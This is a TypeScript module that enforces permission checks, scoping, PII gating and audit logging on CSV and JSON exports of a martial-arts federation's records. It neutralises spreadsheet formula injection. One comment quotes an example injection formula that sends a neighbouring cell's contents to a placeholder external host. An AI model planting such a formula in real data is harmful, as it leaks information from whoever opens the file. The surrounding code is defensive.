// Permissioned data export — CSV and JSON (§86, PART AU, PART AV).
//
// ─────────────────────────────────────────────────────────────────────────────
// THE RULE THIS MODULE EXISTS TO ENFORCE
// ─────────────────────────────────────────────────────────────────────────────
//
//     Every export: permission checked, logged, scoped.
//
// All three, in one place, for every kind. An export is the single easiest way
// to leak a whole table — it is a list endpoint with no pagination and a file
// at the end of it — so none of the three may be left to the caller. The
// endpoint under src/pages/api/export/ parses a query string and sets headers;
// it decides nothing. Everything that could be got wrong is here.
//
// ─────────────────────────────────────────────────────────────────────────────
// WHY THE KINDS ARE A REGISTRY AND NOT A FUNCTION PER TABLE
// ─────────────────────────────────────────────────────────────────────────────
//
// A function per table means the permission check, the scope predicate and the
// audit write are written out seven times, and the seventh is the one that
// forgets. Here a kind is DATA: which table, which read action, which columns
// carry scope, which columns are personal. runExport() is the only code path,
// so a new kind cannot be added without being gated, scoped and logged — there
// is no other way to reach the database from this module.
//
// ─────────────────────────────────────────────────────────────────────────────
// WHAT IS NOT HERE
// ─────────────────────────────────────────────────────────────────────────────
//
// XLSX and PDF. Both need a library, and this codebase adds no dependencies.
// They are not stubbed, not listed as a format and not offered in an error
// message, because a format that appears in an error message is a format
// somebody will report as broken. See the limitations note in the response.

import { and, asc, inArray, or, sql } from 'drizzle-orm';
import * as s from '@/db/schema';
import { writeAudit, type AuditContext } from '@/db/federation';
import {
  assertCanAnywhere, canAnywhere, visibleScopes,
  type Action, type Principal,
} from '@/lib/rbac';

type DB = any;   // drizzle client (postgres.js in production, PGlite in tests)
type Col = any;  // a drizzle column

// ─── Refusals ───────────────────────────────────────────────────────────────

/**
 * A refusal the operator is meant to read. `code` decides the HTTP status at
 * the edge; the message is written for a human and is passed through verbatim.
 */
export class ExportError extends Error {
  readonly code: string;

  constructor(code: string, message: string) {
    super(message);
    this.name = 'ExportError';
    this.code = code;
  }
}

// ─── Limits ─────────────────────────────────────────────────────────────────

/**
 * The row cap.
 *
 * Not a performance guess. An export runs inside a serverless invocation with a
 * fixed memory ceiling, and the rows are materialised before the response is
 * serialised — so an uncapped export of a table that grows is an outage that
 * arrives without a deployment. The cap is reported alongside the number of
 * rows that MATCHED, so a truncated export is never mistaken for a complete
 * one: the caller is told how many rows the file holds AND how many the filter
 * matched, rather than only the first of the two.
 */
export const DEFAULT_ROW_LIMIT = 1_000;
export const MAX_ROW_LIMIT = 10_000;

// ─── Column and kind description ────────────────────────────────────────────

export interface ExportColumn {
  /** Key in the JSON output. */
  key: string;
  /**
   * CSV header. WHERE A COLUMN CARRIES A UNIT, THE UNIT IS IN THE HEADER —
   * money is exported as the integer paise it is stored as, so a header of
   * `total` rather than `total (paise)` is how an amount gets read as rupees
   * and a federation's takings are misreported by two decimal places.
   */
  header: string;
  col: Col;
  /**
   * True for a column that is personal data. Included only when the caller
   * holds the kind's `piiAction`. The audit record lists the columns actually
   * written, so which of the two shapes was taken is reconstructable.
   */
  pii?: boolean;
  /**
   * True for an amount in integer minor units. Checked at serialisation time
   * rather than trusted: see formatMoney().
   */
  money?: boolean;
}

interface ExportKindSpec {
  id: string;
  /** What the file contains, in plain words. Used in the JSON envelope. */
  label: string;
  table: Col;
  /**
   * An optional join, used ONLY to reach the columns that carry scope. A
   * membership row has no state of its own; the person it belongs to does.
   */
  join?: { table: Col; on: any };
  /** The read action for the kind. Held IN ADDITION to 'export:run'. */
  action: Action;
  /** Held to include the columns marked `pii`. */
  piiAction?: Action;
  /**
   * The columns that place a row in the federation. An EMPTY object means the
   * kind has no scope column at all, and a scoped holder is REFUSED rather than
   * handed an empty file — see scopePredicate().
   */
  scope: { state?: Col; district?: Col; dojo?: Col; institution?: Col };
  /** Ordering and the row cap's tiebreak. Ascending id is stable and repeatable. */
  idColumn: Col;
  /** The column `from`/`to` filter against, if the kind supports a date window. */
  dateColumn?: Col;
  /** The column `status` filters against, if the kind has one. */
  statusColumn?: Col;
  columns: ExportColumn[];
}

// ─── The kinds ──────────────────────────────────────────────────────────────
//
// Each entry answers the same three questions, and the third is the one that is
// easy to skip: WHAT MAKES A ROW MINE? A kind whose answer is "nothing" is
// national-only by construction, and says so rather than filtering to nothing.

const KINDS: ExportKindSpec[] = [
  {
    id: 'persons',
    label: 'Person records',
    table: s.persons,
    action: 'person:read',
    // Date of birth, e-mail and telephone are marked PRIVATE in the schema. A
    // register export that carries them is a different disclosure from one that
    // does not, so it needs the action that says so.
    piiAction: 'person:read_pii',
    scope: { state: s.persons.stateUnitId, district: s.persons.districtUnitId, dojo: s.persons.dojoId },
    idColumn: s.persons.id,
    dateColumn: s.persons.createdAt,
    statusColumn: s.persons.status,
    columns: [
      { key: 'id', header: 'id', col: s.persons.id },
      { key: 'federationId', header: 'federation_id', col: s.persons.federationId },
      { key: 'fullName', header: 'full_name', col: s.persons.fullName },
      { key: 'status', header: 'status', col: s.persons.status },
      { key: 'city', header: 'city', col: s.persons.city },
      { key: 'stateUnitId', header: 'state_unit_id', col: s.persons.stateUnitId },
      { key: 'districtUnitId', header: 'district_unit_id', col: s.persons.districtUnitId },
      { key: 'dojoId', header: 'dojo_id', col: s.persons.dojoId },
      { key: 'createdAt', header: 'created_at', col: s.persons.createdAt },
      { key: 'dob', header: 'dob', col: s.persons.dob, pii: true },
      { key: 'gender', header: 'gender', col: s.persons.gender, pii: true },
      { key: 'email', header: 'email', col: s.persons.email, pii: true },
      { key: 'phone', header: 'phone', col: s.persons.phone, pii: true },
    ],
  },

  {
    id: 'dojos',
    label: 'Affiliated dojos',
    table: s.dojos,
    action: 'dojo:read',
    // A dojo-bound holder is matched on the dojo's OWN id — the row is the
    // scope, rather than pointing at one.
    scope: { state: s.dojos.stateUnitId, district: s.dojos.districtUnitId, dojo: s.dojos.id },
    idColumn: s.dojos.id,
    dateColumn: s.dojos.createdAt,
    statusColumn: s.dojos.status,
    columns: [
      { key: 'id', header: 'id', col: s.dojos.id },
      { key: 'code', header: 'code', col: s.dojos.code },
      { key: 'name', header: 'name', col: s.dojos.name },
      { key: 'status', header: 'status', col: s.dojos.status },
      { key: 'city', header: 'city', col: s.dojos.city },
      { key: 'stateUnitId', header: 'state_unit_id', col: s.dojos.stateUnitId },
      { key: 'districtUnitId', header: 'district_unit_id', col: s.dojos.districtUnitId },
      { key: 'affiliatedOn', header: 'affiliated_on', col: s.dojos.affiliatedOn },
      { key: 'affiliationExpiresOn', header: 'affiliation_expires_on', col: s.dojos.affiliationExpiresOn },
      { key: 'createdAt', header: 'created_at', col: s.dojos.createdAt },
    ],
  },

  {
    id: 'memberships',
    label: 'Membership records',
    table: s.memberships,
    // A membership row carries no state, district or dojo. Its person does, so
    // the join is not a convenience — it is the only way this kind can be
    // scoped at all, and without it the kind would have to be national-only.
    join: { table: s.persons, on: sql`${s.persons.id} = ${s.memberships.personId}` },
    action: 'membership:read',
    scope: { state: s.persons.stateUnitId, district: s.persons.districtUnitId, dojo: s.persons.dojoId },
    idColumn: s.memberships.id,
    dateColumn: s.memberships.createdAt,
    statusColumn: s.memberships.status,
    columns: [
      { key: 'id', header: 'id', col: s.memberships.id },
      { key: 'personId', header: 'person_id', col: s.memberships.personId },
      { key: 'federationId', header: 'federation_id', col: s.persons.federationId },
      { key: 'category', header: 'category', col: s.memberships.category },
      { key: 'status', header: 'status', col: s.memberships.status },
      { key: 'validFrom', header: 'valid_from', col: s.memberships.validFrom },
      { key: 'validTo', header: 'valid_to', col: s.memberships.validTo },
      { key: 'createdAt', header: 'created_at', col: s.memberships.createdAt },
      // The member's name is the person's name, and a list of who holds a
      // membership is a list of people. It travels with the PII columns.
      { key: 'fullName', header: 'full_name', col: s.persons.fullName, pii: true },
    ],
    piiAction: 'person:read_pii',
  },

  {
    id: 'leads',
    label: 'Enquiries',
    table: s.leads,
    action: 'engagement:read',
    // An enquiry IS contact details — there is nothing else in it. Splitting a
    // lead export into a version without them would produce a file of reference
    // numbers, so the contact columns are gated on engagement:read itself and
    // there is no reduced shape. A caller who may read enquiries may read the
    // contact on them; that is what the action means.
    scope: {
      state: s.leads.stateUnitId,
      district: s.leads.districtUnitId,
      institution: s.leads.institutionId,
    },
    idColumn: s.leads.id,
    dateColumn: s.leads.createdAt,
    statusColumn: s.leads.status,
    columns: [
      { key: 'id', header: 'id', col: s.leads.id },
      { key: 'ref', header: 'ref', col: s.leads.ref },
      { key: 'audience', header: 'audience', col: s.leads.audience },
      { key: 'status', header: 'status', col: s.leads.status },
      { key: 'contactName', header: 'contact_name', col: s.leads.contactName },
      { key: 'contactEmail', header: 'contact_email', col: s.leads.contactEmail },
      { key: 'contactPhone', header: 'contact_phone', col: s.leads.contactPhone },
      { key: 'firstSource', header: 'first_source', col: s.leads.firstSource },
      { key: 'lastSource', header: 'last_source', col: s.leads.lastSource },
      { key: 'city', header: 'city', col: s.leads.city },
      { key: 'institutionId', header: 'institution_id', col: s.leads.institutionId },
      { key: 'stateUnitId', header: 'state_unit_id', col: s.leads.stateUnitId },
      { key: 'districtUnitId', header: 'district_unit_id', col: s.leads.districtUnitId },
      { key: 'createdAt', header: 'created_at', col: s.leads.createdAt },
      { key: 'updatedAt', header: 'updated_at', col: s.leads.updatedAt },
    ],
  },

  {
    id: 'institutions',
    label: 'Client institutions',
    table: s.institutions,
    action: 'engagement:read',
    scope: {
      state: s.institutions.stateUnitId,
      district: s.institutions.districtUnitId,
      institution: s.institutions.id,
    },
    idColumn: s.institutions.id,
    dateColumn: s.institutions.createdAt,
    statusColumn: s.institutions.status,
    columns: [
      { key: 'id', header: 'id', col: s.institutions.id },
      { key: 'code', header: 'code', col: s.institutions.code },
      { key: 'name', header: 'name', col: s.institutions.name },
      { key: 'kind', header: 'kind', col: s.institutions.kind },
      { key: 'status', header: 'status', col: s.institutions.status },
      { key: 'city', header: 'city', col: s.institutions.city },
      { key: 'postcode', header: 'postcode', col: s.institutions.postcode },
      { key: 'campusCount', header: 'campus_count', col: s.institutions.campusCount },
      { key: 'populationCount', header: 'population_count', col: s.institutions.populationCount },
      { key: 'stateUnitId', header: 'state_unit_id', col: s.institutions.stateUnitId },
      { key: 'districtUnitId', header: 'district_unit_id', col: s.institutions.districtUnitId },
      { key: 'createdAt', header: 'created_at', col: s.institutions.createdAt },
    ],
  },

  {
    id: 'orders',
    label: 'Orders',
    table: s.orders,
    // Scoped through the buyer, where there is one. A fee-only order with no
    // person attached therefore falls OUT of a scoped holder's export — the
    // join produces nulls and the predicate rejects them. That is the
    // fail-closed direction: a row nobody can place is a row nobody scoped
    // takes away in a file.
    join: { table: s.persons, on: sql`${s.persons.id} = ${s.orders.personId}` },
    action: 'finance:read',
    scope: { state: s.persons.stateUnitId, district: s.persons.districtUnitId, dojo: s.persons.dojoId },
    idColumn: s.orders.id,
    dateColumn: s.orders.createdAt,
    statusColumn: s.orders.status,
    piiAction: 'person:read_pii',
    columns: [
      { key: 'id', header: 'id', col: s.orders.id },
      { key: 'orderNo', header: 'order_no', col: s.orders.orderNo },
      { key: 'status', header: 'status', col: s.orders.status },
      { key: 'personId', header: 'person_id', col: s.orders.personId },
      { key: 'currency', header: 'currency', col: s.orders.currency },
      // Integer minor units, and the header says so. NEVER divided by 100 on the
      // way out: binary floating point cannot hold every two-decimal value
      // exactly, so the division introduces a trailing error, and a spreadsheet
      // that rounds a federation's takings is worse than one that makes the
      // reader do the division themselves.
      { key: 'subtotalPaise', header: 'subtotal (paise)', col: s.orders.subtotalPaise, money: true },
      { key: 'taxPaise', header: 'tax (paise)', col: s.orders.taxPaise, money: true },
      { key: 'shippingPaise', header: 'shipping (paise)', col: s.orders.shippingPaise, money: true },
      { key: 'discountPaise', header: 'discount (paise)', col: s.orders.discountPaise, money: true },
      { key: 'totalPaise', header: 'total (paise)', col: s.orders.totalPaise, money: true },
      { key: 'paidAt', header: 'paid_at', col: s.orders.paidAt },
      { key: 'createdAt', header: 'created_at', col: s.orders.createdAt },
      { key: 'buyerName', header: 'buyer_name', col: s.orders.buyerName, pii: true },
      { key: 'email', header: 'email', col: s.orders.email, pii: true },
      { key: 'phone', header: 'phone', col: s.orders.phone, pii: true },
    ],
  },

  {
    id: 'audit-events',
    label: 'Audit events',
    table: s.auditEvents,
    action: 'audit:read',
    // DELIBERATELY EMPTY. `audit_events` records who did what, not where the
    // subject sat, so there is no column that could place a row in a state or a
    // dojo. A scoped holder is refused outright by scopePredicate() rather than
    // handed a file filtered to nothing — an empty audit export reads as "no
    // such activity", which about a compliance record is the worst possible
    // wrong answer.
    scope: {},
    idColumn: s.auditEvents.id,
    dateColumn: s.auditEvents.at,
    columns: [
      { key: 'id', header: 'id', col: s.auditEvents.id },
      { key: 'at', header: 'at', col: s.auditEvents.at },
      { key: 'actorLabel', header: 'actor_label', col: s.auditEvents.actorLabel },
      { key: 'actorRole', header: 'actor_role', col: s.auditEvents.actorRole },
      { key: 'actorUserId', header: 'actor_user_id', col: s.auditEvents.actorUserId },
      { key: 'entityType', header: 'entity_type', col: s.auditEvents.entityType },
      { key: 'entityId', header: 'entity_id', col: s.auditEvents.entityId },
      { key: 'action', header: 'action', col: s.auditEvents.action },
      { key: 'reason', header: 'reason', col: s.auditEvents.reason },
      { key: 'authority', header: 'authority', col: s.auditEvents.authority },
      { key: 'requestId', header: 'request_id', col: s.auditEvents.requestId },
      // actor_ip_hash is NOT exported. It is a stable hash of a caller's IP, so
      // a file of them is a file of pseudonymous identifiers that a self-join
      // deanonymises — see the note in reportConcern() in src/db/cases.ts. It
      // stays where the access controls around the table can see it.
    ],
  },
];

const KIND_BY_ID = new Map(KINDS.map((k) => [k.id, k]));

/** The kinds a principal could export at all, for a menu or a 404 body. */
export function availableKinds(principal: Principal | null | undefined): { id: string; label: string }[] {
  if (!canAnywhere(principal, 'export:run')) return [];
  return KINDS
    .filter((k) => canAnywhere(principal, k.action))
    .map((k) => ({ id: k.id, label: k.label }));
}

/** Every kind this module knows, regardless of authority. For documentation. */
export function allKindIds(): string[] {
  return KINDS.map((k) => k.id);
}

// ─── CSV serialisation ──────────────────────────────────────────────────────

/**
 * A field that a spreadsheet would evaluate rather than display.
 *
 * `=`, `+`, `-` and `@` open a formula in Excel, LibreOffice and Google Sheets;
 * a leading tab or carriage return is stripped by the parser and hands the
 * NEXT character the same power, which is why both are here too. The attack is
 * not theoretical and does not need a macro: a field of
 * `=HYPERLINK("https://x.example/"&A1,"Click")` exfiltrates the neighbouring
 * cell to whoever wrote the field, and every DDE variant is worse.
 *
 * The federation takes enquiries through public forms. Every one of those
 * fields ends up in an export, which means an untrusted stranger chooses the
 * first character of a cell in a file an administrator opens.
 */
const FORMULA_TRIGGER = /^[=+\-@\t\r]/;

/**
 * One CSV field, RFC 4180, with formula injection neutralised.
 *
 * Neutralisation is a leading apostrophe, which is the conventional mitigation
 * and the one spreadsheet software understands as "this is text". It CHANGES
 * THE VALUE, and that cost is real: a telephone number written `+91 ...` comes
 * back as `'+91 ...`. That is the trade being made deliberately — a mangled
 * dialling prefix is recoverable by the reader, and a formula that ran is not.
 *
 * Numbers are never passed through here as raw values (see formatValue), so a
 * negative amount is not mistaken for a formula and quoted with an apostrophe.
 */
export function csvField(value: string): string {
  const neutralised = FORMULA_TRIGGER.test(value) ? `'${value}` : value;
  // Quote when the content requires it, and ALWAYS when it was neutralised, so
  // the apostrophe cannot be read as part of an unquoted token.
  if (neutralised !== value || /["\r\n,]/.test(neutralised)) {
    return `"${neutralised.replace(/"/g, '""')}"`;
  }
  return neutralised;
}

/**
 * A stored value as a finished CSV field.
 *
 * NEUTRALISATION IS APPLIED TO TEXT AND NOT TO NUMBERS, and the distinction is
 * load-bearing rather than tidy. `-500` in a discount column is a number this
 * module formatted; running it through csvField() would emit `'-500`, which is
 * a spreadsheet reading a federation's money as text. The trigger characters
 * only matter for values a stranger could have chosen, and a stranger cannot
 * choose the type of an integer column.
 *
 * Dates go out in ISO 8601 because that is the only format that sorts, parses
 * and means the same thing in every locale — `dd/mm/yyyy` and `mm/dd/yyyy` are
 * the same ten characters and different days.
 */
function csvCell(v: unknown, column: ExportColumn): string {
  if (v === null || v === undefined) return '';
  if (column.money) return formatMoney(v, column);
  if (v instanceof Date) return v.toISOString();
  if (typeof v === 'number') return Number.isFinite(v) ? String(v) : '';
  if (typeof v === 'boolean') return v ? 'true' : 'false';
  if (typeof v === 'object') return csvField(JSON.stringify(v));
  return csvField(String(v));
}

/**
 * An amount in minor units, verified.
 *
 * Money is stored as integer paise everywhere in this codebase, so a
 * non-integer here means either the column is not what the registry claims or a
 * driver has handed back a float. Both are wrong, and both are silent — the
 * file just quietly says a slightly different number. It throws instead.
 */
function formatMoney(v: unknown, column: ExportColumn): string {
  const n = typeof v === 'string' ? Number(v) : v;
  if (typeof n !== 'number' || !Number.isInteger(n)) {
    throw new ExportError(
      'bad_money_value',
      `Column ${column.header} is declared as minor units but did not hold a whole number. Nothing was exported.`
    );
  }
  return String(n);
}

/**
 * The UTF-8 byte order mark.
 *
 * Excel on Windows opens a .csv with the system ANSI codepage unless the file
 * begins with this, which turns every non-ASCII character into mojibake. The
 * federation's registers are full of Indian names, so without three bytes at
 * the front the export is wrong for most of the people in it.
 */
export const UTF8_BOM = '\uFEFF';   // as an escape: a literal BOM in source is invisible

/** CRLF, per RFC 4180 — and what Excel writes and expects. */
const CRLF = '\r\n';

/**
 * The CSV, a chunk at a time.
 *
 * Yielding rather than concatenating means the whole file never exists as one
 * string, so peak memory is the row set plus one chunk rather than the row set
 * plus a copy of the entire serialised output. The row set itself IS bounded —
 * by MAX_ROW_LIMIT — because it is read in one query; see the limitations note.
 */
export function* csvChunks(
  columns: ExportColumn[],
  rows: Record<string, unknown>[],
  rowsPerChunk = 200
): Generator<string> {
  yield UTF8_BOM + columns.map((c) => csvField(c.header)).join(',') + CRLF;

  let buffer: string[] = [];
  for (const row of rows) {
    buffer.push(columns.map((c) => csvCell(row[c.key], c)).join(','));
    if (buffer.length >= rowsPerChunk) {
      yield buffer.join(CRLF) + CRLF;
      buffer = [];
    }
  }
  if (buffer.length) yield buffer.join(CRLF) + CRLF;
}

/** The whole CSV as one string. For callers that want it in hand — and tests. */
export function toCsv(columns: ExportColumn[], rows: Record<string, unknown>[]): string {
  let out = '';
  for (const chunk of csvChunks(columns, rows)) out += chunk;
  return out;
}

// ─── JSON serialisation ─────────────────────────────────────────────────────

/**
 * A stored value as JSON.
 *
 * NO FORMULA NEUTRALISATION HERE, and that is not an omission. The apostrophe
 * is a spreadsheet convention; adding it to JSON would corrupt the value for
 * every machine consumer to defend against a spreadsheet that is not going to
 * open the file. The defence belongs at the format that has the vulnerability.
 */
function jsonValue(v: unknown, column: ExportColumn): unknown {
  if (v === null || v === undefined) return null;
  if (column.money) return Number(formatMoney(v, column));
  if (v instanceof Date) return v.toISOString();
  return v;
}

// ─── Scope, as a SQL predicate ──────────────────────────────────────────────

/**
 * The WHERE clause that restricts an export to what the caller may see.
 *
 * Returns null for a caller with national reach — nothing to add. Never returns
 * a permissive clause, and never returns a clause that would match everything
 * by accident: a scoped caller whose scopes map to NO column on this kind is
 * REFUSED, because the alternative is a well-formed file with no rows in it and
 * a reader who concludes the federation has none.
 *
 * There is no array filtering anywhere in this module. Reading the rows and
 * then dropping some is a disclosure with a filter over it — the rows were
 * already fetched, already in memory, and one forgotten `.filter()` away from
 * being written to the file.
 */
function scopePredicate(principal: Principal, action: Action, kind: ExportKindSpec): any | null {
  const scopes = visibleScopes(principal, action);
  if (scopes.kind === 'all') return null;
  if (scopes.kind === 'none') {
    throw new ExportError(
      'out_of_scope',
      'Your credential holds this authority in no scope, so there is nothing to export.'
    );
  }

  const clauses: any[] = [];
  if (scopes.states.length && kind.scope.state) clauses.push(inArray(kind.scope.state, scopes.states));
  if (scopes.districts.length && kind.scope.district) clauses.push(inArray(kind.scope.district, scopes.districts));
  if (scopes.dojos.length && kind.scope.dojo) clauses.push(inArray(kind.scope.dojo, scopes.dojos));
  if (scopes.institutions.length && kind.scope.institution) {
    clauses.push(inArray(kind.scope.institution, scopes.institutions));
  }

  if (!clauses.length) {
    throw new ExportError(
      'national_only',
      `The ${kind.id} export cannot be narrowed to your scope: these records carry no column that places them ` +
      'in a state, district, dojo or institution. It is available to national authority only.'
    );
  }

  // OR across the scope kinds a holder actually has: a caller bound to one state
  // and one dojo elsewhere may see both, and neither widens the other.
  return clauses.length === 1 ? clauses[0] : or(...clauses);
}

/**
 * Whether the PERSONAL columns may travel with this particular file.
 *
 * Holding the PII action somewhere is not the same as holding it over the rows
 * being exported, and a file has one column set for every row in it — there is
 * no per-row shape. So the question is not "does this caller hold
 * person:read_pii" but "does this caller hold it over EVERYTHING this file will
 * contain".
 *
 * The case this exists for is real and constructible from the role table as it
 * stands: TRAINING_DIRECTOR bound nationally holds export:run and person:read,
 * COACH_MANAGER bound to one state holds person:read_pii. Somebody holding both
 * bindings asked canAnywhere() and got true, and took the whole national
 * register with dates of birth, e-mail addresses and telephone numbers on it —
 * having been given that authority in one state. This is the same mistake the
 * export:run / read-action intersection above already fixes, in the third
 * action nobody intersected.
 *
 * Withholding the columns is the right refusal rather than narrowing the rows.
 * Dropping rows would hand the caller a file that is short without saying so;
 * dropping columns produces exactly the file a caller without the action gets,
 * and the audit record names the columns actually written.
 */
function piiCoversExport(principal: Principal, kind: ExportKindSpec): boolean {
  if (!kind.piiAction) return true;
  const pii = visibleScopes(principal, kind.piiAction);
  if (pii.kind === 'none') return false;
  if (pii.kind === 'all') return true;

  // Every row in the file satisfies BOTH the read predicate and the run
  // predicate, so it is enough for EITHER to sit inside the PII scope.
  return (
    scopeWithin(visibleScopes(principal, kind.action), pii) ||
    scopeWithin(visibleScopes(principal, 'export:run'), pii)
  );
}

/**
 * True when every scope in `inner` is one `outer` also holds, dimension by
 * dimension.
 *
 * Compared WITHIN a dimension only. A district that sits inside a state the
 * caller holds PII over is not credited, because proving containment needs the
 * unit hierarchy and a wrong answer here discloses personal data. Refusing to
 * infer is the fail-closed direction: the cost is a reduced column set for a
 * caller who might have been entitled to the full one, which is recoverable by
 * granting the action at the scope they actually export from.
 */
function scopeWithin(
  inner: ReturnType<typeof visibleScopes>,
  outer: { kind: 'scoped'; states: number[]; districts: number[]; dojos: number[]; institutions: number[] }
): boolean {
  // 'all' is wider than any scoped set; 'none' cannot reach here, because
  // scopePredicate() refuses it before the query is built. Both are false.
  if (inner.kind !== 'scoped') return false;
  const within = (a: number[], b: number[]) => a.every((id) => b.includes(id));
  return (
    within(inner.states, outer.states) &&
    within(inner.districts, outer.districts) &&
    within(inner.dojos, outer.dojos) &&
    within(inner.institutions, outer.institutions)
  );
}

// ─── Filters ────────────────────────────────────────────────────────────────

export interface ExportFilters {
  /** Status values, matched against the kind's status column. */
  status?: string[];
  /** Inclusive calendar-date bounds on the kind's date column, ISO yyyy-mm-dd. */
  from?: string;
  to?: string;
}

const ISO_DATE = /^\d{4}-\d{2}-\d{2}$/;

function filterConditions(kind: ExportKindSpec, filters: ExportFilters): any[] {
  const conds: any[] = [];

  if (filters.status?.length) {
    if (!kind.statusColumn) {
      throw new ExportError('bad_filter', `The ${kind.id} export has no status to filter on.`);
    }
    // Validated against the column's own enum rather than passed through. An
    // unknown value against a Postgres enum raises a type error the caller
    // cannot read, and silently returning nothing would be worse still.
    const allowed: string[] | undefined = (kind.statusColumn as any).enumValues;
    if (allowed?.length) {
      const unknown = filters.status.filter((v) => !allowed.includes(v));
      if (unknown.length) {
        throw new ExportError(
          'bad_filter',
          `Unknown status ${unknown.join(', ')}. Accepted: ${allowed.join(', ')}.`
        );
      }
    }
    conds.push(inArray(kind.statusColumn, filters.status));
  }

  if (filters.from || filters.to) {
    if (!kind.dateColumn) {
      throw new ExportError('bad_filter', `The ${kind.id} export has no date to filter on.`);
    }
    if (filters.from) {
      if (!ISO_DATE.test(filters.from)) throw new ExportError('bad_filter', '`from` must be a date as yyyy-mm-dd.');
      conds.push(sql`${kind.dateColumn} >= ${filters.from}::date`);
    }
    if (filters.to) {
      if (!ISO_DATE.test(filters.to)) throw new ExportError('bad_filter', '`to` must be a date as yyyy-mm-dd.');
      // STRICTLY LESS THAN THE NEXT DAY, not `<= to`. The column is a timestamp,
      // so `<= '2026-08-14'` means "up to midnight" and silently drops every row
      // recorded on the day the caller asked for — the commonest off-by-one in
      // any report, and invisible because the file still looks right.
      conds.push(sql`${kind.dateColumn} < (${filters.to}::date + 1)`);
    }
  }

  return conds;
}

// ─── The export ─────────────────────────────────────────────────────────────

export interface ExportRequest {
  kind: string;
  format: 'csv' | 'json';
  filters?: ExportFilters;
  limit?: number;
}

export interface ExportResult {
  kind: string;
  label: string;
  format: 'csv' | 'json';
  /** Headers written to the file. */
  columns: string[];
  /** How many rows the file contains. */
  rowsReturned: number;
  /** How many rows matched before the cap. */
  rowsMatched: number;
  /** True when rowsReturned < rowsMatched — the file is not the whole answer. */
  truncated: boolean;
  limit: number;
  filters: ExportFilters;
  /** Suggested download filename. */
  filename: string;
  /** The serialised body, a chunk at a time. */
  body: Iterable<string>;
  contentType: string;
}

export const FORMATS = ['csv', 'json'] as const;

/**
 * Run an export. The only path from this module to the database.
 *
 * Order matters and is not incidental:
 *
 *  1. AUTHORITY, before a query is built. 'export:run' AND the kind's read
 *     action — separately. 'export:run' alone is the authority to take a file
 *     away, not the authority to read anything in particular; a support agent
 *     with export:run must not thereby be able to export the member register.
 *  2. SCOPE, as SQL, from BOTH actions. See the note below.
 *  3. THE COUNT, before the capped read, so the caller can be told what they did
 *     not get.
 *  4. THE AUDIT, before the rows are handed back and with nothing caught. If the
 *     audit write fails the export FAILS: an export that is not audited is an
 *     exfiltration nobody can reconstruct afterwards, and returning the file
 *     anyway would be choosing the convenience over the record.
 */
export async function runExport(
  db: DB,
  ctx: AuditContext,
  request: ExportRequest
): Promise<ExportResult> {
  const principal = ctx.principal;
  const kind = KIND_BY_ID.get(request.kind);
  if (!kind) {
    throw new ExportError('unknown_kind', `There is no export called ${request.kind}.`);
  }
  if (!FORMATS.includes(request.format)) {
    throw new ExportError('unsupported_format', `Format must be one of: ${FORMATS.join(', ')}.`);
  }

  // 1. Both gates. canAnywhere, not can — a state administrator holds their
  //    actions in a state and would be refused outright by a resource-less
  //    can(); the scope predicate below is what restricts them to their rows.
  assertCanAnywhere(principal, 'export:run');
  assertCanAnywhere(principal, kind.action);

  // 2. Scope from BOTH actions, intersected.
  //
  //    Holding export:run in one state and the read action nationally must not
  //    export the country, and neither must the reverse. Each contributes a
  //    predicate; a national reach contributes none; ANDing them is the
  //    intersection. Doing this on the read action alone was the earlier
  //    reading and is wrong in exactly the case that matters.
  const conds: any[] = [];
  const readScope = scopePredicate(principal, kind.action, kind);
  if (readScope) conds.push(readScope);
  const runScope = scopePredicate(principal, 'export:run', kind);
  if (runScope) conds.push(runScope);

  conds.push(...filterConditions(kind, request.filters ?? {}));

  const limit = Math.max(1, Math.min(MAX_ROW_LIMIT, Math.floor(request.limit ?? DEFAULT_ROW_LIMIT)));

  // Scope-aware, not canAnywhere(). See piiCoversExport() — holding the action
  // in one state must not put personal columns on a national file.
  const includePii = piiCoversExport(principal, kind);
  const columns = kind.columns.filter((c) => !c.pii || includePii);

  const where = conds.length ? and(...conds) : undefined;

  const applyFrom = (q: any) => {
    let out = q.from(kind.table);
    // A LEFT join: for a national caller the unmatched rows still belong in the
    // file, and for a scoped one the null side fails the predicate on its own.
    if (kind.join) out = out.leftJoin(kind.join.table, kind.join.on);
    return where ? out.where(where) : out;
  };

  // 3. What matched, before the cap.
  const counted = await applyFrom(db.select({ n: sql<number>`count(*)::int` }));
  const rowsMatched = Number(counted[0]?.n ?? 0);

  const selection: Record<string, Col> = {};
  for (const c of columns) selection[c.key] = c.col;

  const rows: Record<string, unknown>[] = await applyFrom(db.select(selection))
    .orderBy(asc(kind.idColumn))
    .limit(limit);

  const rowsReturned = rows.length;
  const truncated = rowsReturned < rowsMatched;
  const filters = request.filters ?? {};

  // Money is checked EAGERLY, here, and not left to the serialiser.
  //
  // The CSV body is generated lazily so the whole file never exists at once,
  // which means a throw inside the generator happens after the response headers
  // have already gone out — the caller would receive a truncated file carrying
  // a 200. Failing before the audit write and before a single byte is sent is
  // the only version of this that cannot hand somebody a silently short file.
  for (const c of columns) {
    if (!c.money) continue;
    for (const r of rows) {
      if (r[c.key] !== null && r[c.key] !== undefined) formatMoney(r[c.key], c);
    }
  }

  // 4. The record. Who, what kind, how many rows, which filters — and which
  //    columns, so a later reader can tell whether personal data left the
  //    building without having to guess from the caller's role.
  await writeAudit(db, ctx, {
    entityType: 'export',
    entityId: kind.id,
    action: 'export',
    newValue: {
      kind: kind.id,
      format: request.format,
      rowsReturned,
      rowsMatched,
      truncated,
      limit,
      filters,
      columns: columns.map((c) => c.key),
      includedPersonalData: columns.some((c) => c.pii),
    },
  });

  const stamp = new Date().toISOString().slice(0, 10);
  const filename = `mmakf-${kind.id}-${stamp}.${request.format}`;

  const body: Iterable<string> =
    request.format === 'csv'
      ? csvChunks(columns, rows)
      : [JSON.stringify({
          kind: kind.id,
          label: kind.label,
          generatedAt: new Date().toISOString(),
          rowsReturned,
          rowsMatched,
          truncated,
          limit,
          filters,
          columns: columns.map((c) => c.key),
          rows: rows.map((r) => {
            const out: Record<string, unknown> = {};
            for (const c of columns) out[c.key] = jsonValue(r[c.key], c);
            return out;
          }),
        }, null, 2)];

  return {
    kind: kind.id,
    label: kind.label,
    format: request.format,
    columns: columns.map((c) => c.header),
    rowsReturned,
    rowsMatched,
    truncated,
    limit,
    filters,
    filename,
    body,
    contentType:
      request.format === 'csv'
        ? 'text/csv; charset=utf-8'
        : 'application/json; charset=utf-8',
  };
}
